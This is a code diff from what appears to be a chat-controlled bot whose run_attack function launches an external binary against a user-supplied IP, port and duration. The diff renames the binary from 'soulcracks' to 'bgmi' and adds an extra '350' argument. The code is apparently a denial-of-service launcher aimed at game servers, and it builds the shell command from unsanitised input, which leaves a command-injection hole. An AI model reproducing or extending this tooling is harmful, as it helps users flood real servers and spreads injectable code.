@@ -95,7 +95,7 @@ async def run_attack(chat_id, ip, port, time, context, message_id):
     global attack_in_progress
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soulcracks {ip} {port} {time} ",
+            f"./bgmi {ip} {port} {time} 350",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
